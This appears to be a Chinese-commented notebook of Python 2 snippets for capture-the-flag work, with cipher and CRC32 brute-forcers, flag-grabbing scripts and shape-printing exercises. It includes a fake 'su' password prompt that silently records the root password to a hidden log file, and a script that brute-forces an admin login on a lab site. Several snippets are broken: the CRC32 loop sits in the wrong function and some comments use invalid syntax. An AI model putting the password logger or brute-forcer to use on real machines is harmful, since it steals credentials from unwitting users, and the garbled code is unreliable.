    result = {x:'' for x in range(b)}
    for i in range(elen):
        a = i % b;
        result.update({a:result[a] + e[i]})
    d = ''
    for i in range(b):
        d = d + result[i]
    print '分为\t'+str(f)+'\t'+'栏时，解密结果为：  '+d
}



#凯撒密码破解
{	
import sys

def move(src, num):
    for c in src:
        sys.stdout.write(chr(ord(c)+num))
    print
if len(sys.argv) != 2:
    print 'this.py text'
    exit(0)
ciphertext = sys.argv[1]
min,max = 0xff, 0
for c in ciphertext:
    now = ord(c)
    if now < min:
        min = now
    if now > max:
        max = now
rightmove = ord('~')-max
leftmove  = min - ord('0')
for i in range(1, rightmove+1):
    move(ciphertext, i)
for i in range(1, leftmove+1):
    move(ciphertext, -i)	
}


	
#CRC32爆破
{	
#!/usr/bin/env python 
# -*- coding: UTF-8 -*- 
########################################################## 
# 脚本二 : 修正了一些 BUG  , 可以正常打印日志 , 把握进度 # 
# 修改时间 : 2017/03/20 # TODO : 可以穷举的字典的顺序进行调整 , 以字母的统计频率进行调整 
# 可以提高整体穷举效率 
########################################################## 
import binascii 
import time 
import winsound 
startTime = time.time() 
# 程序开始运行 
#----------Config start----------# 
# 需要被破解的CRC32的值 
keys = [int("0xA359AFC1",16), int("0xCF5F72B9",16), int("0xDF7BF1C9",16), int("0x6E38B65E",16)] 
# 设置爆破的范围 , 默认所有可打印字符 
myRange = [' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'] 
# 注 : #     这里的代码可以穷举四位可打印字符 , 可以根据需要修改代码中的嵌套循环层数 #    不知道如何能使用参数控制循环嵌套的层数 , 如果有知道的小伙伴儿一定要联系我哦 , 一起进步 
#----------Config end----------# 
RESULT = {} 
# 结果字典 
def getCRC32(str): 
	'''
	计算CRC32
	''' 
	return (binascii.crc32(str) & 0xffffffff) 
def checkSuccess(keys, mycrc32, words): 
	'''
    检测是否成功匹配
    参数 : 
        keys : 所有需要爆破的CRC32值
        mycrc32 : 某次计算得到的明文(words)的CRC32
        words : 明文
    ''' 
	global RESULT 
	for key in keys: 
		if key == mycrc32: 
			RESULT[keys.index(key)] = words 
			words = "" 
			counter = 0 	# 用于计算速度 
			oldTime = time.clock() 
			for i in myRange: 
				nowTime = time.clock() 
				print "Trying : " + words + "\t" + "Speed : " + str(counter / (nowTime - oldTime)) + " / s" + "\t" + "Result : " + str(RESULT) 	# 输出日志 
				oldTime = nowTime 
				for j in myRange: 
					for k in myRange: 
						for l in myRange: 
							words = i + j + k + l 	# 构造明文 
							counter += 1 
							myCRC32 = getCRC32(words) # 计算明文CRC32 
							checkSuccess(keys, myCRC32, words) # 检查是否匹配 
endTime = time.time() 
print "Result : " + str(RESULT) 	# 输入爆破结果 
print "Cost : " + str(endTime-startTime) + " s" # 输出总花费时间
}

{
    #!/bin/bash/python  
    import sys  
    from collections import Counter  
    file = open(sys.argv[1], 'r')  
    readlist = []  
    count_times = []  
    for line in file.readlines():  
    line = line.strip('\r\n ')  
    readlist.append(line)  
    sortlist = Counter(readlist).most_common()  
    for line in sortlist:  
    print line[0]
}
	
#记录root密码小工具
{
    #!/usr/bin/python  
    import os, sys, getpass, time  
    current_time = time.strftime("%Y-%m-%d %H:%M")  
    logfile="/dev/shm/.su.log"              //密码获取后记录在这里  
    #CentOS                  
    #fail_str = "su: incorrect password"  
    #Ubuntu               
    #fail_str = "su: Authentication failure"  
    #For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样  
    fail_str = "su: incorrect password" 
    try:  
        passwd = getpass.getpass(prompt='Password: ');  
        file=open(logfile,'a')  
        file.write("[%s]t%s"%(passwd, current_time))   //截取root密码  
        file.write('n')  
        file.close()  
    except:  
        pass 
    time.sleep(1)  
    print fail_str                               //打印切换root失败提示 

}

#设置源端口反弹shell
{

}


#自动获取flag
{
    import requests   
    import base64  
      
    url='http://ctf4.shiyanbar.com/web/10.php'   
    req=requests.get(url)  
    print req.text  
    key=req.headers['FLAG']  
    key=base64.b64decode(key)  
    key=key.split(':')[1].strip()  
    data={'key':key}  
    r=requests.post(url,data=data)   
    print(r.text)  
}


#自动提交flag
{
import requests  
  
url = "http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"  
req = requests.session()  
header = {"Cookie":"PHPSESSID=9b8f8686269f5d70a44766e3c5f4dcdc"}  
for pwd in xrange(1000,10000):  
  
	data={'username':'admin','pwd':pwd,'vcode':'c3pe'}  
  
	ret = req.post(url, data=data, headers=header)  
	print ret.text  
	if 'error' not in ret.text:  
		print pwd  
		break  
}


#python 打印菱形、三角形、矩形
#coding:utf-8
rows = int(raw_input('输入列数： '))
i = j = k = 1 #声明变量，i用于控制外层循环（图形行数），j用于控制空格的个数，k用于控制*的个数
#等腰直角三角形1
print "等腰直角三角形1"
for i in range(0, rows):
    for k in range(0, rows - i):
        print " * ", #注意这里的","，一定不能省略，可以起到不换行的作用
        k += 1
    i += 1
    print "\n"
 
#打印实心等边三角形
print "打印空心等边三角形，这里去掉if-else条件判断就是实心的"
for i in range(0, rows + 1):#变量i控制行数
    for j in range(0, rows - i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(0, 2 * i - 1):#(1,2*i)
        if k == 0 or k == 2 * i - 2 or i == rows:
            if i == rows:
                if k % 2 == 0:#因为第一个数是从0开始的，所以要是偶数打印*，奇数打印空格
                    print "*",
                else:
                    print " ", #注意这里的","，一定不能省略，可以起到不换行的作用
            else:
               print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
 
#打印菱形
print "打印空心等菱形，这里去掉if-else条件判断就是实心的"
for i in range(rows):#变量i控制行数
    for j in range(rows - i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(2 * i - 1):#(1,2*i)
        if k == 0 or k == 2 * i - 2:
            print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
    #菱形的下半部分
for i in range(rows):
    for j in range(i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(2 * (rows - i) - 1):#(1,2*i)
        if k == 0 or k == 2 * (rows - i) - 2:
            print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
#实心正方形
print "实心正方形"
for i in range(0, rows):
    for k in range(0, rows):
        print " * ", #注意这里的","，一定不能省略，可以起到不换行的作用
        k += 1
    i += 1
    print "\n"
 
#空心正方形
print "空心正方形"
for i in range(0, rows):
    for k in range(0, rows):
        if i != 0 and i != rows - 1:
            if k == 0 or k == rows - 1:
                #由于视觉效果看起来更像正方形，所以这里*两侧加了空格，增大距离
                print " * ", #注意这里的","，一定不能省略，可以起到不换行的作用
            else:
                 print "   ", #该处有三个空格
        else:
            print " * ", #这里*两侧加了空格
        k += 1
    i += 1
    print "\n"